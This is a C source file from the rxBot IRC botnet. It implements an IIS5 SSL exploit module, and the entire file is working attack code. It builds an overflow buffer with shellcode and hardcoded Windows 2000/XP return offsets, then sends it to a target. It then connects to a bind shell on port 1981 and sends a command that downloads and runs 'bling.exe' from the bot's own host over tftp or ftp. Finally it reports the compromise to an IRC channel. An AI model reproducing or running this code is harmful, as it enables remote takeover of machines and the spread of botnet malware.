/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_IIS5SSL

#define jumper					"\xeb\x0f"
#define bind_shell_code			"\x4E\x49\x4C\x53\x49\x53\x47\x41\x59\x21\x21"

extern char shellcode[];

BOOL IIS5SSL(EXINFO exinfo)
{
	char buffer[IRCLINE];
	char request[]="\x80\x62\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x82\x01\x00\x00\x00";

	unsigned long XOR=0xffffffff;
	unsigned long offsets[] = {	
		0x6741a1cd,		// Win2K SP0
		0x6741a199,		// Win2K SP1
		0x6741a426,		// Win2K SP2
		0x67419e1d,		// Win2K SP3
		0x67419ce8,		// Win2K SP4
		0x0ffb7de9,		// WinXP SP0
		0x0ffb832f		// WinXP SP1
	};

	BOOL bRet = FALSE;

	unsigned char *badbuffer=(unsigned char*)malloc(347); 
	memset(badbuffer, 0, 347);
	unsigned char *p=badbuffer; 
	memcpy(p, request, sizeof(request));
	p+=sizeof(request)-1; 
	strcat((char*)p, jumper);
	strcat((char*)p, bind_shell_code);

	SOCKET sSock;
	if((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;

		// FIX ME: since i didnt found a way to determine the remote OS, i
		//		   placed this all together in a loop. this aint the best way
		//		   i'm sure about that
		for (int i=0; i < (sizeof(offsets) / sizeof(LPTSTR)); i++) {
			memset(&ssin, 0, sizeof(ssin));
			ssin.sin_family = AF_INET;
			ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
			ssin.sin_port = fhtons(exinfo.port);

			if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
				offsets[i]^=XOR; 
				strncat((char*)p, (char*)&offsets[i], 4);
				strcat((char*)p, shellcode);

				if (fsend(sSock, (char *)&badbuffer, strlen((char *)&badbuffer), 0)) { 
					Sleep(1000); 
					fclosesocket(sSock);
			
					memset(&ssin, 0, sizeof(ssin));
					ssin.sin_family = AF_INET;
					ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
					ssin.sin_port = fhtons(1981);

					if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin))) {
						char cmd_buff[400];

						#ifndef NO_TFTPD
						_snprintf(cmd_buff, sizeof (cmd_buff),
							"tftp -i %s get %s\r\n",
							GetIP(exinfo.sock),filename, filename);	
						#endif
						#ifndef NO_FTPD
						_snprintf(cmd_buff, sizeof (cmd_buff),
							"echo open %s %d > o&echo user 1 1 >> o &echo get bling.exe >> o &echo quit >> o &ftp -n -s:o &bling.exe\r\n",
							GetIP(exinfo.sock),(unsigned short)ftpport);	
						#endif
							
						if(frecv(exinfo.sock, buffer, sizeof(buffer), 0) > 0) {
							Sleep(500);

							if(fsend(sSock,(char*)cmd_buff, strlen(cmd_buff),0) > 0) {
								fclosesocket(sSock);

								bRet = TRUE;
								_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
								if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
								addlog(buffer);

								break;
							}
						}
					}
				}
			}
			fclosesocket(sSock);
		}
	}

	return (bRet);
}
#endif
